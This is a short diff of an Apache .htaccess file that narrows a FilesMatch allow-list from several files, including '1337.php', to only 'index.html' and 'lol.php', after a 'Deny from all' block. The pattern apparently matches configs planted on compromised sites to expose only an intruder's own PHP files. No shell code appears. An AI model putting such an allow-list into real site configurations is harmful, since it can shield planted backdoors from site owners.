@@ -27,7 +27,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(index.html|1337.php|.html|google5cb83bf0b3bb0baa.html)$">
+<FilesMatch "^(index.html|lol.php)$">
 
  Order allow,deny
 
